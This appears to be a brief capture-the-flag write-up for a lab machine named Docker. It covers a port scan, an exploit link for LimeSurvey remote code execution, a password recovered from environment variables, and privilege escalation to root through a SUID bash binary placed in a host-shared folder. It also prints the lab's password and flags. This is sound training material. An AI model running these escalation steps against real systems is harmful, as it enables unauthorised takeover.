#Docker
Scan : 
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4ed7eb69ce06654281701b631b1ce234 (ECDSA)
|_  256 c1c607cff025ddde5f9c3f71f158bd8d (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
```

- Setup a mysql server  with docker compose try to avoid the user root , then finish the installation and follow this github to get a shell : https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/blob/main/exploit.py

- We exec `env` and get : pass --> 5W5HN4K4GCXf9E

User: VL{426b3b0a5425049b64219e9aeff3aa48}

- We enumerate the docker with : https://github.com/stealthcopter/deepce
and find a shared folder between the host and the docker  so we upload a /bin/bash
 with these perm : 
 
```sh
chmod u+s run
chmod +x run
```

- We can then connect with ssh exec the bash file to get the root :
```sh
./run -p # to keep the privileges
```

Root: VL{d75a070fbff631e40b21c99aea5d0a1a}